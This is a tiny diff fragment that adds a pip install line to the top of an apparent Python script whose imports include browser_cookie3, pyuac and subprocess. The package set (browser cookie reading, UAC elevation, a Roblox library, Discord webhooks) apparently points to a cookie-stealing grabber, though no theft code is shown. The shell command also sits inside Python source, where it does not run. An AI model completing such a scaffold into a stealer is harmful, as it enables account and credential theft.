@@ -1,3 +1,4 @@
+pip install browser-cookie3 pyuac requests robloxpy discord-webhook
 import browser_cookie3
 import pyuac
 import subprocess
